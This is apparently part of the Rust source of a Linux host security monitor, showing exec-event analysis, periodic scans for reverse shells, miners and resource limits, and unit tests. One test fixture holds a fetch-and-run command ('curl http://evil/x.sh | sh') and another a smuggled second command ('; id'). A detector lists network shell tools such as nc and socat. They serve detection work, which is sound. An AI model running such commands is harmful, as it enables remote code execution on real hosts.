        let d = (process::exe(ppid), process::cgroup(ppid));
        if let Some(p) = self.parents.get_mut(&ppid) {
            p.details = Some(d.clone());
        }
        d
    }

    /// May this combination ever take the fast path? Everything whose
    /// verdict depends on the command line, the parent's cgroup or a
    /// privilege change always gets the full analysis.
    fn fast_candidate(&self, o: &Observed) -> bool {
        let r = &self.an.rules;
        let exe = o.exe.as_deref().unwrap_or("");
        !exe.is_empty()
            && !exe.ends_with(" (deleted)")
            && !exe.starts_with("/memfd:")
            && !r.writable.is_match(exe)
            && !r.kthread_like.is_match(&o.info.comm)
            && !o.info.comm.starts_with('[')
            && !r.miners.is_match(&o.info.comm)
            // web and database parents: the command line decides
            && !r.web_users.contains(&o.parent_user)
            && !r.web_comms.is_match(&o.parent_comm)
            && !r.is_db_parent(o)
            && !r.is_web_user(&o.user)
            // privilege changes: sudo/su/pkexec children, setuid binaries
            && !(o.info.ruid == 0 && (o.parent_ruid != 0 || o.parent_euid != 0))
            && o.info.ruid == o.info.euid
    }

    fn learn(&mut self, key: ExecKey, eligible: bool, clean: bool, now: Instant) {
        if !self.fast_path {
            return;
        }
        if !eligible || !clean {
            self.fast.remove(&key);
            return;
        }
        if self.fast.len() >= FAST_KEYS_MAX && !self.fast.contains_key(&key) {
            self.fast.clear();
        }
        let f = self.fast.entry(key).or_insert(FastState { clean: 0, hits: 0, since: now });
        f.clean = f.clean.saturating_add(1);
        if f.clean == FAST_AFTER {
            f.since = now;
        }
    }

    /// Analyse an exec of `pid`.
    pub fn on_exec(
        &mut self,
        pid: i32,
        users: &dyn Fn(u32) -> String,
        lineage: &std::sync::Mutex<Lineage>,
    ) -> Vec<Event> {
        let now = Instant::now();
        // The process replaced its image: what we cached about it as a parent is stale.
        self.parents.remove(&pid);
        let Ok(raw_status) = process::read_status_raw(pid) else {
            self.stats.vanished += 1;
            return Vec::new();
        };
        // Name, parent and uids are all the fast path needs; the rest of the
        // file is parsed only for the full analysis.
        let status = process::parse_status_head(&raw_status);
        let exe = process::exe(pid);
        let parent = self.parent(status.ppid, users, now);
        let key = ExecKey {
            parent_comm: parent.comm.clone(),
            parent_ruid: parent.ruid,
            parent_euid: parent.euid,
            comm: status.name.clone(),
            exe: exe.clone().unwrap_or_default(),
            uids: [status.uid[0], status.uid[1], status.uid[2]],
        };
        if self.fast_path
            && let Some(f) = self.fast.get_mut(&key)
            && f.clean >= FAST_AFTER
        {
            if now.saturating_duration_since(f.since) >= FAST_TTL {
                self.fast.remove(&key);
            } else {
                f.hits += 1;
                let hits = f.hits;
                if self.recheck_every > 0 && hits % self.recheck_every == 0 {
                    self.stats.rechecks += 1;
                } else if self.fast_checks_pass(pid, &status, hits) {
                    self.an.note_creds(pid, 0, status.uid[0], status.uid[1], status.uid[2]);
                    self.stats.fast += 1;
                    return Vec::new();
                }
            }
        }

        // Full analysis.
        let Ok(stat) = process::read_stat(pid) else {
            self.stats.vanished += 1;
            return Vec::new();
        };
        let info = process::info_from(stat, &process::parse_status(&raw_status));
        let mut o = Observed {
            exe,
            cmdline: process::cmdline(pid, 2048).unwrap_or_default(),
            user: users(info.ruid),
            cgroup: process::cgroup(pid),
            parent_pid: status.ppid,
            parent_comm: parent.comm,
            parent_exe: None,
            parent_ruid: parent.ruid,
            parent_euid: parent.euid,
            parent_user: parent.user,
            parent_cgroup: None,
            info,
        };
        if self.an.needs_parent_details(&o) {
            (o.parent_exe, o.parent_cgroup) = self.parent_details(o.parent_pid);
        }
        let found = {
            let mut lin = lock(lineage);
            self.an.on_exec(&o, Some(&mut lin))
        };
        self.stats.full += 1;
        let eligible = self.fast_candidate(&o);
        self.learn(key, eligible, found.is_empty(), now);
        found
    }

    /// The checks the fast path keeps: scripts started from writable
    /// locations (shells/interpreters, every time) and LD_PRELOAD in root
    /// processes (every [`LD_PRELOAD_SAMPLE`]-th exec: reading another
    /// process's environment walks its memory and costs more than the rest
    /// of the fast path together; an injection that persists — a unit's or
    /// cron's environment — shows up within a few execs).
    fn fast_checks_pass(&self, pid: i32, status: &process::Status, hits: u32) -> bool {
        let r = &self.an.rules;
        if r.is_shell(&status.name) || r.interpreters.is_match(&status.name) {
            let cmd = process::cmdline(pid, 2048).unwrap_or_default();
            let argv0 = cmd.split_whitespace().next().unwrap_or("");
            if r.script_from_writable(&status.name, &cmd) || (argv0.starts_with('[') && argv0.ends_with(']')) {
                return false;
            }
        }
        if r.cfg.detect_ld_preload
            && (status.uid[0] == 0 || status.uid[1] == 0)
            && hits % LD_PRELOAD_SAMPLE == 1
            && process::environ_var(pid, "LD_PRELOAD").is_some_and(|v| !v.trim().is_empty())
        {
            return false;
        }
        true
    }

    /// Feed one connector event.
    pub fn handle(
        &mut self,
        ev: proc_connector::ProcEvent,
        me: i32,
        users: &dyn Fn(u32) -> String,
        lineage: &std::sync::Mutex<Lineage>,
    ) -> Vec<Event> {
        use proc_connector::ProcEvent as E;
        match ev {
            E::Exec { tgid, .. } if tgid != me => return self.on_exec(tgid, users, lineage),
            E::Uid { tgid, ruid, euid, .. } if tgid != me => {
                self.parents.remove(&tgid);
                if let Some(o) = Observed::read(tgid, users) {
                    return self.an.on_uid(&o, ruid, euid);
                }
            }
            E::Ptrace { tgid, tracer_tgid, .. } if tracer_tgid > 0 => {
                if let (Some(t), Some(tr)) = (Observed::read(tgid, users), Observed::read(tracer_tgid, users)) {
                    return self.an.on_ptrace(&t, &tr);
                }
            }
            E::Comm { pid, tgid, .. } if pid == tgid => {
                self.parents.remove(&tgid);
            }
            E::Exit { pid, tgid, .. } if pid == tgid => {
                self.parents.remove(&tgid);
                self.an.on_exit(tgid);
            }
            _ => {}
        }
        Vec::new()
    }

    /// Events were dropped (socket overrun): exits may be missing.
    pub fn on_lost(&mut self) {
        self.parents.clear();
        self.an.forget_unverified_creds();
    }
}

pub fn run_exec_sensor(shared: &Arc<Shared>, sink: &Sink) -> Result<(), String> {
    let cfg = shared.config();
    if !cfg.process.enabled || !cfg.process.proc_connector {
        return Ok(());
    }
    let generation = shared.generation();
    // Fork events are not needed (exec and exit carry everything): on Linux
    // 6.6+ the kernel then never queues them for us.
    use proc_connector::{PROC_EVENT_COMM, PROC_EVENT_EXEC, PROC_EVENT_EXIT, PROC_EVENT_PTRACE, PROC_EVENT_UID};
    let mask = PROC_EVENT_EXEC | PROC_EVENT_UID | PROC_EVENT_PTRACE | PROC_EVENT_COMM | PROC_EVENT_EXIT;
    let mut conn = proc_connector::Connector::open_filtered(mask)
        .map_err(|e| format!("proc connector: {e}{}", warden_sys::sched::permission_hint(&e, "CAP_NET_ADMIN")))?;
    let mut pipe = ExecPipeline::new(&cfg.process);
    let me = std::process::id() as i32;
    shared.set_sensor("proc_connector", SensorState::Running);
    let users = |uid: u32| shared.user_name(uid);
    let mut published = ExecStats::default();
    loop {
        if shared.generation() != generation || shared.is_shutting_down() {
            return Err("configuration reloaded".into());
        }
        let evs = match conn.recv_timeout(Duration::from_secs(2)).map_err(|e| e.to_string())? {
            Some(v) => v,
            None => {
                shared.metrics.inc("warden_proc_events_lost_total", &[], 1.0);
                pipe.on_lost();
                continue;
            }
        };
        let execs = evs.iter().filter(|e| matches!(e, proc_connector::ProcEvent::Exec { .. })).count();
        for e in evs {
            for mut ev in pipe.handle(e, me, &users, &shared.lineage) {
                ev.source = "exec".into();
                sink.emit(ev);
            }
        }
        if execs > 0 {
            shared.metrics.inc("warden_exec_events_total", &[], execs as f64);
        }
        // Publish counters once per batch, not per event.
        if pipe.stats != published {
            published = pipe.stats;
            let m = &shared.metrics;
            m.set("warden_exec_analysed_total", &[("path", "full")], published.full as f64);
            m.set("warden_exec_analysed_total", &[("path", "fast")], published.fast as f64);
            m.set("warden_exec_rechecks_total", &[], published.rechecks as f64);
            m.set("warden_exec_parent_cache_total", &[("result", "hit")], published.parent_hits as f64);
            m.set("warden_exec_parent_cache_total", &[("result", "miss")], published.parent_misses as f64);
            m.set("warden_exec_vanished_total", &[], published.vanished as f64);
        }
    }
}

// ---------------------------------------------------------------------------
// periodic scanner
// ---------------------------------------------------------------------------

pub struct ProcessScanner {
    an: ProcessAnalyzer,
    known: HashSet<(i32, u64)>,
    cpu: HashMap<(i32, u64), (u64, Instant)>,
    hot_since: HashMap<(i32, u64), Instant>,
    dstate: HashMap<(i32, u64), u32>,
    scans: u64,
    limits: warden_core::config::LimitsConfig,
    cpu_cfg: warden_core::config::CpuConfig,
    hog_ignore: GlobList,
    miner_ports: HashSet<u16>,
    rules: Vec<CompiledLimit>,
    limit_hot: HashMap<(usize, i32, u64), Instant>,
    /// Findings that are states of a process (over a limit, hogging the
    /// CPU, stuck in D state…): opened, reminded with backoff, resolved.
    conds: Conditions,
}

/// Reminders of process findings: after 10 minutes, then doubling, at most
/// daily; resolved after five scans (at least a minute) without the finding
/// — the descriptor check runs every 4th scan.
fn finding_policy(scan_interval: Duration) -> Policy {
    Policy::new(
        Duration::from_secs(600),
        Duration::from_secs(24 * 3600),
        scan_interval.saturating_mul(5).max(Duration::from_secs(60)),
    )
}

/// A compiled `[[process.limit]]` rule.
pub struct CompiledLimit {
    pub rule: warden_core::config::LimitRule,
    comm: GlobList,
    units: GlobList,
}

impl CompiledLimit {
    pub fn new(rule: &warden_core::config::LimitRule) -> Self {
        Self { comm: GlobList::new(&rule.comm), units: GlobList::new(&rule.units), rule: rule.clone() }
    }

    /// Does the rule apply to this process? (`user` and `cgroup` are read
    /// lazily: only rules that filter on them pay for the extra `/proc` read.)
    pub fn matches(&self, comm: &str, user: impl FnOnce() -> String, cgroup: impl FnOnce() -> Option<String>) -> bool {
        if !self.rule.comm.is_empty() && !self.comm.is_match(comm) {
            return false;
        }
        if !self.rule.users.is_empty() {
            let user = user();
            if !self.rule.users.contains(&user) {
                return false;
            }
        }
        if !self.rule.units.is_empty() {
            let Some(cg) = cgroup() else { return false };
            if !cg.split('/').any(|c| !c.is_empty() && self.units.is_match(c)) {
                return false;
            }
        }
        true
    }
}

impl ProcessScanner {
    pub fn new(cfg: &warden_core::Config) -> Self {
        Self {
            an: ProcessAnalyzer::new(&cfg.process),
            known: HashSet::new(),
            cpu: HashMap::new(),
            hot_since: HashMap::new(),
            dstate: HashMap::new(),
            scans: 0,
            limits: cfg.limits.clone(),
            cpu_cfg: cfg.cpu.clone(),
            hog_ignore: GlobList::new(&cfg.cpu.hog_ignore),
            miner_ports: cfg.process.miner_ports.iter().copied().collect(),
            rules: cfg.process.limits.iter().map(CompiledLimit::new).collect(),
            limit_hot: HashMap::new(),
            conds: Conditions::new(finding_policy(cfg.process.scan_interval)),
        }
    }

    /// A finding that holds for this process on this scan. Returns the event
    /// to emit when one is due (opening, change, reminder); `None` also when
    /// the process vanished before its details could be read.
    #[allow(clippy::too_many_arguments)] // the finding's parts; a builder would only add noise
    fn state(
        &mut self,
        cx: &Cx<'_>,
        kind: &str,
        // a finding that can hold several times per process (one per limit rule)
        instance: Option<usize>,
        sev: Severity,
        (pid, start_time): (i32, u64),
        title: impl FnOnce() -> String,
        actions: Vec<ActionSpec>,
    ) -> Option<Event> {
        let key = match instance {
            Some(i) => format!("{kind}:{i}:{pid}:{start_time}"),
            None => format!("{kind}:{pid}:{start_time}"),
        };
        let rep = self.conds.hold(&key, kind, sev, cx.now, cx.real)?;
        let users = |uid: u32| cx.shared.user_name(uid);
        let Some(o) = Observed::read(pid, &users) else {
            self.conds.forget(&key);
            return None;
        };
        let title = title();
        let label = format!("{kind}: {}[{pid}]", o.info.comm);
        self.conds.describe(&key, Subject::Process(o.to_ref()), label);
        let mut ev = finding_event(kind, sev, title, &o, actions).fingerprint(Conditions::fingerprint(&key, sev));
        if let Report::Reminder(n) = rep {
            ev = ev.detail("reminder", n);
        }
        if let Some(next) = self.conds.next_reminder_in(&key) {
            ev = ev.detail("next_reminder_in", warden_core::units::human_duration(next));
        }
        Some(ev)
    }

    /// Evaluate `[[process.limit]]` rules: sustained CPU, lifetime, RSS.
    fn check_limits(&mut self, cx: &Cx<'_>, table: &HashMap<i32, ProcInfo>, cpu_pct: &HashMap<(i32, u64), f64>) {
        if self.rules.is_empty() {
            return;
        }
        let now = cx.now;
        let tck = warden_sys::util::clk_tck() as f64;
        let uptime = warden_sys::system::uptime_secs().unwrap_or(0.0);
        let mut live = HashSet::new();
        let mut breaches = Vec::new();
        for p in table.values().filter(|p| !p.kernel_thread && p.state != 'Z') {
            // The light snapshot has no credentials: read `status` only for
            // rules that filter by user, once per process.
            let user = std::cell::OnceCell::new();
            let user_of = || {
                user.get_or_init(|| {
                    let uid = if p.ruid != u32::MAX {
                        p.ruid
                    } else {
                        process::read_status(p.pid).map(|s| s.uid[0]).unwrap_or(u32::MAX)
                    };
                    cx.shared.user_name(uid)
                })
                .clone()
            };
            for (i, r) in self.rules.iter().enumerate() {
                if !r.matches(&p.comm, user_of, || process::cgroup(p.pid)) {
                    continue;
                }
                let key = (i, p.pid, p.start_time);
                let mut breach: Option<(String, String)> = None;
                if let Some(limit) = r.rule.cpu_percent {
                    let pct = cpu_pct.get(&(p.pid, p.start_time)).copied().unwrap_or(0.0);
                    if pct >= limit {
                        live.insert(key);
                        let since = *self.limit_hot.entry(key).or_insert(now);
                        let held = now.saturating_duration_since(since);
                        if held >= r.rule.cpu_duration {
                            breach = Some((
                                "cpu".into(),
                                format!(
                                    "{pct:.0}% CPU for {}s (limit {limit:.0}% for {}s)",
                                    held.as_secs(),
                                    r.rule.cpu_duration.as_secs()
                                ),
                            ));
                        }
                    }
                }
                if breach.is_none()
                    && let Some(max) = r.rule.max_runtime
                {
                    let age = (uptime - p.start_time as f64 / tck).max(0.0);
                    if age >= max.as_secs_f64() {
                        breach =
                            Some(("runtime".into(), format!("running for {}s (limit {}s)", age as u64, max.as_secs())));
                    }
                }
                if breach.is_none()
                    && let Some(max) = r.rule.max_rss
                    && p.rss >= max.as_u64()
                {
                    breach =
                        Some(("rss".into(), format!("RSS {} (limit {})", warden_core::units::human_bytes(p.rss), max)));
                }
                let Some((metric, what)) = breach else { continue };
                breaches.push((i, p.pid, p.start_time, p.comm.clone(), metric, what));
            }
        }
        self.limit_hot.retain(|k, _| live.contains(k));
        for (i, pid, start, comm, metric, what) in breaches {
            let (name, actions) = (self.rules[i].rule.name.clone(), self.rules[i].rule.actions.clone());
            // one condition per rule and process
            let title = || format!("limit {name:?}: {comm}[{pid}] {what}");
            let kind = "process.limit_exceeded";
            if let Some(ev) = self.state(cx, kind, Some(i), Severity::Warning, (pid, start), title, actions) {
                cx.emit(ev.detail("rule", name.clone()).detail("metric", metric).detail("measurement", what.clone()));
            }
        }
    }

    fn reverse_shells(&mut self, cx: &Cx<'_>, table: &HashMap<i32, ProcInfo>, established: &HashMap<u64, net::Socket>) {
        for p in table.values() {
            if p.kernel_thread
                || !(self.an.rules.is_shell(&p.comm)
                    || ["nc", "ncat", "netcat", "socat", "python", "python3", "perl", "php", "ruby"]
                        .contains(&p.comm.as_str()))
            {
                continue;
            }
            // Only descriptors 0–2 matter: three readlinks instead of listing
            // every descriptor of a busy interpreter.
            let stdio_sock: Vec<&net::Socket> = process::stdio_targets(p.pid)
                .iter()
                .flatten()
                .filter_map(|t| process::socket_inode(t))
                .filter_map(|i| established.get(&i))
                .collect();
            if stdio_sock.len() >= 2 {
                let remote = stdio_sock[0].remote.to_string();
                let ip = stdio_sock[0].remote.ip().to_string();
                let a = self.an.rules.cfg.response.reverse_shell.clone();
                let title = || format!("reverse shell: {}[{}] has stdin/stdout connected to {remote}", p.comm, p.pid);
                let id = (p.pid, p.start_time);
                if let Some(ev) = self.state(cx, "security.reverse_shell", None, Severity::Critical, id, title, a) {
                    cx.emit(ev.detail("remote", remote.clone()).detail("ip", ip));
                }
            }
        }
    }
}

impl Detector for ProcessScanner {
    fn name(&self) -> &'static str {
        "process"
    }

    fn interval(&self) -> Duration {
        self.an.rules.cfg.scan_interval
    }

    fn sections(&self) -> &'static [&'static str] {
        &["/process", "/cpu", "/limits"]
    }

    fn reconfigure(&mut self, cfg: &warden_core::Config) -> bool {
        // Known processes, CPU history, open findings and the credentials
        // the analyzer tracks stay: a reload is not a first scan (0.13.3
        // reported every process again as "found at startup").
        self.an.rules = ProcRules::new(&cfg.process);
        self.limits = cfg.limits.clone();
        self.cpu_cfg = cfg.cpu.clone();
        self.hog_ignore = GlobList::new(&cfg.cpu.hog_ignore);
        self.miner_ports = cfg.process.miner_ports.iter().copied().collect();
        let rules: Vec<CompiledLimit> = cfg.process.limits.iter().map(CompiledLimit::new).collect();
        if rules.iter().map(|r| &r.rule.name).ne(self.rules.iter().map(|r| &r.rule.name)) {
            self.limit_hot.clear(); // indices of other rules now
        }
        self.rules = rules;
        self.conds.set_policy(finding_policy(cfg.process.scan_interval));
        true
    }

    fn close(&mut self) -> Vec<Event> {
        self.conds
            .close_all()
            .into_iter()
            .map(|c| c.event(format!("{}: {}", c.label, crate::runtime::NO_LONGER_WATCHED)))
            .collect()
    }

    fn tick(&mut self, cx: &mut Cx<'_>) {
        let now = cx.now;
        self.scans += 1;
        let realtime = cx.shared.sensor_running("proc_connector");
        let first = self.known.is_empty();
        // With the connector running, new processes are analysed at exec time
        // and tracers are reported by ptrace events, so the periodic table only
        // needs `stat` (comm, state, CPU, RSS, start time): half the files, and
        // not `status`, the costliest one for the kernel to generate.
        let light = realtime && !first;
        let table = if light { process::snapshot_light() } else { process::snapshot() };
        let tck = warden_sys::util::clk_tck() as f64;
        let users = |uid: u32| cx.shared.user_name(uid);

        // New processes: full exec analysis when the connector is not available,
        // and always on the very first scan (catch what started before us).
        let mut current = HashSet::with_capacity(table.len());
        for p in table.values() {
            if p.kernel_thread {
                continue;
            }
            let key = (p.pid, p.start_time);
            current.insert(key);
            if (first || !realtime)
                && !self.known.contains(&key)
                && let Some(o) = Observed::read(p.pid, &users)
            {
                let found = {
                    let mut lin = lock(&cx.shared.lineage);
                    self.an.on_exec(&o, if first { None } else { Some(&mut lin) })
                };
                let act = !first || self.an.rules.cfg.act_on_existing;
                for mut ev in found {
                    if first {
                        ev = ev.detail("found_at_startup", true);
                    }
                    if !act {
                        // Started before Warden: no lineage/timing context —
                        // report only, and the heuristics must not contain
                        // the process on this evidence either.
                        ev = ev.detail(warden_core::event::ACTIONS_WITHHELD, "process.act_on_existing = false");
                        if !ev.actions.is_empty() {
                            ev.actions.clear();
                            ev = ev.detail(
                                "note",
                                "process predates Warden; actions skipped (process.act_on_existing = false)",
                            );
                        }
                    }
                    cx.emit(ev);
                }
            }
        }
        self.known = current;

        // Network view for reverse shells and mining pools.
        let socks = net::tcp_sockets();
        let established: HashMap<u64, net::Socket> =
            socks.iter().filter(|s| s.state == net::TCP_ESTABLISHED).map(|s| (s.inode, s.clone())).collect();
        if self.an.rules.cfg.detect_reverse_shell {
            self.reverse_shells(cx, &table, &established);
        }
        let pool_conns: Vec<&net::Socket> =
            established.values().filter(|s| self.miner_ports.contains(&s.remote.port())).collect();
        let pool_owner: HashMap<u64, i32> = if pool_conns.is_empty() {
            HashMap::new()
        } else {
            net::socket_owners(&pool_conns.iter().map(|s| s.inode).collect())
        };

        // CPU usage per process.
        let mut cpu_pct: HashMap<(i32, u64), f64> = HashMap::new();
        let mut next_cpu = HashMap::with_capacity(table.len());
        for p in table.values() {
            let key = (p.pid, p.start_time);
            if let Some((t0, at)) = self.cpu.get(&key) {
                let dt = now.saturating_duration_since(*at).as_secs_f64();
                if dt > 0.0 {
                    cpu_pct.insert(key, (p.cpu_ticks.saturating_sub(*t0)) as f64 / tck / dt * 100.0);
                }
            }
            next_cpu.insert(key, (p.cpu_ticks, now));
        }
        self.cpu = next_cpu;

        for (key, pct) in &cpu_pct {
            let Some(p) = table.get(&key.0) else { continue };
            if *pct >= self.cpu_cfg.hog_percent.min(80.0) {
                let since = *self.hot_since.entry(*key).or_insert(now);
                let hot_for = now.saturating_duration_since(since);
                let exe = process::exe(p.pid).unwrap_or_default();
                let from_writable = self.an.rules.writable.is_match(exe.trim_end_matches(" (deleted)"));
                let pool = pool_owner.values().any(|pid| *pid == p.pid);
                let id = (p.pid, p.start_time);
                if (from_writable || pool) && hot_for >= Duration::from_secs(60) {
                    let a = self.an.rules.cfg.response.miner.clone();
                    let title = || format!("probable crypto-miner: {}[{}] at {pct:.0}% CPU from {exe}", p.comm, p.pid);
                    if let Some(ev) = self.state(cx, "security.miner", None, Severity::Critical, id, title, a) {
                        cx.emit(ev.detail("cpu_percent", pct.round()).detail("pool_connection", pool));
                    }
                } else if *pct >= self.cpu_cfg.hog_percent
                    && hot_for >= self.cpu_cfg.hog_duration
                    && !self.hog_ignore.is_match(&p.comm)
                {
                    let title = || {
                        format!("{}[{}] has been using {pct:.0}% CPU for {}m", p.comm, p.pid, hot_for.as_secs() / 60)
                    };
                    if let Some(ev) = self.state(cx, "process.cpu_hog", None, Severity::Warning, id, title, Vec::new())
                    {
                        cx.emit(ev);
                    }
                }
            } else {
                self.hot_since.remove(key);
            }
        }
        self.hot_since.retain(|k, _| cpu_pct.contains_key(k));
        self.check_limits(cx, &table, &cpu_pct);

        // Connections to mining pool ports (scored even without CPU burn).
        for s in &pool_conns {
            let Some(pid) = pool_owner.get(&s.inode).copied() else { continue };
            let Some(p) = table.get(&pid) else { continue };
            let (comm, id) = (p.comm.clone(), (pid, p.start_time));
            let title = || format!("{comm}[{pid}] connected to {} (typical mining-pool port)", s.remote);
            if let Some(ev) = self.state(cx, "security.miner_port", None, Severity::Warning, id, title, Vec::new()) {
                cx.emit(ev.detail("remote", s.remote.to_string()).detail("ip", s.remote.ip().to_string()));
            }
        }

        // Zombies and uninterruptible sleep.
        let zombies: Vec<&ProcInfo> = table.values().filter(|p| p.state == 'Z').collect();
        cx.metric("warden_zombie_processes", &[], zombies.len() as f64);
        if zombies.len() as u64 >= self.limits.zombies_warning
            && let Some(rep) = self.conds.hold("process.zombies", "process.zombies", Severity::Warning, cx.now, cx.real)
        {
            self.conds.describe("process.zombies", Subject::System, format!("{} zombie processes", zombies.len()));
            let mut parents: HashMap<String, usize> = HashMap::new();
            for z in &zombies {
                let pc =
                    table.get(&z.ppid).map(|p| format!("{}[{}]", p.comm, p.pid)).unwrap_or_else(|| z.ppid.to_string());
                *parents.entry(pc).or_default() += 1;
            }
            let mut ev =
                Event::new("process.zombies", Severity::Warning, format!("{} zombie processes", zombies.len()))
                    .fingerprint("process.zombies:warning")
                    .detail("parents", serde_json::json!(parents))
                    .detail("hint", "the parent does not reap children; restarting the parent clears them");
            if let Report::Reminder(n) = rep {
                ev = ev.detail("reminder", n);
            }
            cx.emit(ev);
        }
        let mut dnext = HashMap::new();
        for p in table.values().filter(|p| p.state == 'D' && !p.kernel_thread) {
            let k = (p.pid, p.start_time);
            let n = self.dstate.get(&k).copied().unwrap_or(0) + 1;
            dnext.insert(k, n);
            let secs = n as u64 * self.an.rules.cfg.scan_interval.as_secs();
            if secs >= 120 {
                let title = || format!("{}[{}] stuck in uninterruptible I/O wait for {secs}s+", p.comm, p.pid);
                let kind = "process.uninterruptible";
                if let Some(ev) = self.state(cx, kind, None, Severity::Warning, k, title, Vec::new()) {
                    let wchan = std::fs::read_to_string(format!("/proc/{}/wchan", p.pid)).unwrap_or_default();
                    cx.emit(ev.detail("wchan", wchan));
                }
            }
        }
        self.dstate = dnext;

        // Per-process descriptor exhaustion (every 4th scan — it is the expensive part).
        let fd_pass = self.scans % 4 == 1;
        if fd_pass {
            for p in table.values().filter(|p| !p.kernel_thread) {
                let n = process::fd_count(p.pid);
                if n < 512 {
                    continue;
                }
                if let Some(limit) = process::nofile_limit(p.pid)
                    && limit > 0
                {
                    let pct = n as f64 * 100.0 / limit as f64;
                    if pct >= self.limits.process_fd_warning_percent {
                        let title =
                            || format!("{}[{}] uses {n} of {limit} file descriptors ({pct:.0}%)", p.comm, p.pid);
                        let id = (p.pid, p.start_time);
                        let kind = "limits.process_fds";
                        if let Some(ev) = self.state(cx, kind, None, Severity::Warning, id, title, Vec::new()) {
                            cx.emit(ev);
                        }
                    }
                }
            }
        }

        // Tracers not seen by the connector.
        if self.an.rules.cfg.detect_ptrace && !realtime {
            for p in table.values().filter(|p| p.tracer_pid > 0) {
                if let (Some(t), Some(tr)) = (Observed::read(p.pid, &users), Observed::read(p.tracer_pid, &users)) {
                    for ev in self.an.on_ptrace(&t, &tr) {
                        cx.emit(ev);
                    }
                }
            }
        }
        // Findings that no longer hold (the process changed or is gone):
        // resolved. The descriptor check counts only on the scans it runs.
        for c in self.conds.sweep(cx.now, |k| fd_pass || k != "limits.process_fds") {
            cx.emit(c.resolved_event());
        }
        let level = match self.conds.worst(|_| true) {
            Some(s) if s >= Severity::Critical => "critical",
            Some(_) => "warning",
            None => "ok",
        };
        cx.shared.set_level("process", level);
        cx.metric("warden_processes", &[], table.len() as f64);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A state finding (here about this test process) is reported once,
    /// reminded later, and resolved when it no longer holds.
    #[test]
    fn state_findings_open_remind_and_resolve() {
        let cfg = warden_core::Config::default(); // scan every 15 s: resolved after 75 s
        let mut sc = ProcessScanner::new(&cfg);
        let shared = crate::runtime::Shared::new(cfg.clone());
        let (sink, _) = crate::runtime::Sink::collector();
        let me = std::process::id() as i32;
        let start = process::start_time(me).unwrap();
        let t0 = Instant::now();
        let cx_at = |s: u64| {
            let mut cx = Cx::new(&shared, &cfg, &sink, "process");
            cx.now = t0 + Duration::from_secs(s);
            cx.real = cx.now;
            cx
        };
        let hog = |sc: &mut ProcessScanner, s: u64| {
            sc.state(&cx_at(s), "process.cpu_hog", None, Severity::Warning, (me, start), || "hog".into(), vec![])
        };
        let first = hog(&mut sc, 0).expect("opened");
        assert_eq!(first.fingerprint, format!("process.cpu_hog:{me}:{start}:warning"));
        assert!(matches!(first.subject, Subject::Process(ref p) if p.pid == me));
        assert!(hog(&mut sc, 300).is_none(), "no repeat before the first reminder");
        let r = hog(&mut sc, 600).expect("first reminder after 10 min");
        assert_eq!(r.details["reminder"], 1);
        assert!(hog(&mut sc, 1000).is_none(), "the second one comes 20 min later");
        assert!(sc.conds.sweep(cx_at(1060).now, |_| true).is_empty());
        let closed = sc.conds.sweep(cx_at(1080).now, |_| true);
        assert_eq!(closed.len(), 1);
        let ev = closed[0].resolved_event();
        assert_eq!(ev.fingerprint, format!("process.cpu_hog:{me}:{start}:resolved"));
        assert!(matches!(ev.subject, Subject::Process(ref p) if p.pid == me), "resolved with its subject");
    }

    /// A reload keeps what the scanner knows: it is not a "first scan".
    #[test]
    fn a_reload_is_not_a_first_scan() {
        let cfg = warden_core::Config::default();
        let mut sc = ProcessScanner::new(&cfg);
        sc.known.insert((1, 1));
        sc.conds.hold("process.zombies", "process.zombies", Severity::Warning, Instant::now(), Instant::now());
        let mut c2 = cfg.clone();
        c2.process.scan_interval = Duration::from_secs(30);
        c2.cpu.hog_percent = 99.0;
        assert!(sc.reconfigure(&c2));
        assert!(sc.known.contains(&(1, 1)) && sc.conds.is_open("process.zombies"));
        assert_eq!(sc.cpu_cfg.hog_percent, 99.0);
        assert_eq!(sc.interval(), Duration::from_secs(30));
        assert_eq!(sc.close().len(), 1, "open findings are closed when the scanner goes");
    }
    use warden_core::config::ProcessConfig;

    #[allow(clippy::too_many_arguments)]
    fn obs(
        comm: &str,
        exe: &str,
        cmd: &str,
        ruid: u32,
        euid: u32,
        user: &str,
        pcomm: &str,
        pruid: u32,
        puser: &str,
    ) -> Observed {
        Observed {
            info: ProcInfo {
                pid: 4242,
                ppid: 4000,
                comm: comm.into(),
                ruid,
                euid,
                suid: euid,
                start_time: 99,
                ..Default::default()
            },
            exe: Some(exe.into()),
            cmdline: cmd.into(),
            user: user.into(),
            cgroup: Some("/system.slice/php8.3-fpm.service".into()),
            parent_pid: 4000,
            parent_comm: pcomm.into(),
            parent_exe: Some(format!("/usr/sbin/{pcomm}")),
            parent_ruid: pruid,
            parent_euid: pruid,
            parent_user: puser.into(),
            parent_cgroup: Some("/system.slice/php8.3-fpm.service".into()),
        }
    }

    fn kinds(v: &[Event]) -> Vec<&str> {
        v.iter().map(|e| e.kind.as_str()).collect()
    }

    #[test]
    fn webshell_spawn_with_red_flags_is_critical_and_killed() {
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        let o = obs(
            "sh",
            "/usr/bin/dash",
            "sh -c curl http://evil/x.sh | sh",
            33,
            33,
            "www-data",
            "php-fpm8.3",
            33,
            "www-data",
        );
        let v = a.on_exec(&o, None);
        let e = v.iter().find(|e| e.kind == "security.web_spawn").unwrap();
        assert_eq!(e.severity, Severity::Critical);
        assert!(matches!(e.actions[0], ActionSpec::Kill { tree: true, .. }));
    }

    #[test]
    fn allowed_tool_through_shell_is_quiet() {
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        let o = obs(
            "sh",
            "/usr/bin/dash",
            "sh -c /usr/sbin/sendmail -t -i",
            33,
            33,
            "www-data",
            "php-fpm8.3",
            33,
            "www-data",
        );
        assert!(!kinds(&a.on_exec(&o, None)).contains(&"security.web_spawn"));
        // but a compound command through the same tool is not allowed
        let o = obs(
            "sh",
            "/usr/bin/dash",
            "sh -c /usr/sbin/sendmail -t; id",
            33,
            33,
            "www-data",
            "php-fpm8.3",
            33,
            "www-data",
        );
        assert!(kinds(&a.on_exec(&o, None)).contains(&"security.web_spawn"));
    }

    /// An administrator's `sudo -u www-data …` in an SSH session is not a
    /// web worker; the same tree in the PHP-FPM service is.
    #[test]
    fn a_web_account_in_a_login_session_is_administration() {
        let mut a = ProcessAnalyzer::new(&ProcessConfig::default());
        let mut o = obs("id", "/usr/bin/id", "id -u", 33, 33, "www-data", "sh", 33, "www-data");
        o.cgroup = Some("/user.slice/user-1000.slice/session-5.scope".into());
        assert!(!kinds(&a.on_exec(&o, None)).contains(&"security.web_spawn"));
